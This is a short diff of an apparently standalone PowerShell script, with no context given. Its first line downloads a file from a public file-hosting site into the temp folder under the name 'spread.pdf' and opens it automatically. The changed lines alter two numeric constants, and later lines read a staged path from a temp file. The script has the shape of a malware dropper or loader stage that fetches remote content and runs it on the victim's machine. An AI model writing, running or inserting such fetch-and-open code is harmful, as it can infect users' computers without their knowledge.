@@ -1,7 +1,7 @@
 iwr 'https://files.catbox.moe/xxlzez.pdf' -OutFile ($d = Join-Path $env:TEMP 'spread.pdf'); ii $d
 
-$1 = 2565719
-$2 = 5439
+$1 = 2564417
+$2 = 4137
 $t = Join-Path $env:TEMP 'path.txt'
 $currentPath = cat -Path $t
 cd -Path $currentPath
